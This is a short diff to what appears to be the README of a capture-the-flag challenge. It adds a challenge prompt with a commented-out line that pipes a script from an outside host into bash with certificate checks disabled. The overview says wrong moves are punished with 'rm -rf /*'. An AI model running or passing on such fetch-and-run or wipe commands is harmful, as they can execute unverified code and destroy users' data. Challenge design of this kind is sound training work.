@@ -1,3 +1,8 @@
+## Challenge Text
+Why's the rum always gone?
+
+`# curl -k https://jackthemonkey.dotpyfe.net/barbossa.sh | bash`
+
 ## Overview
 A two-stage challenge using flags to reward intelligence and false flags (and
 `rm -rf /*`) to punish stupidity.
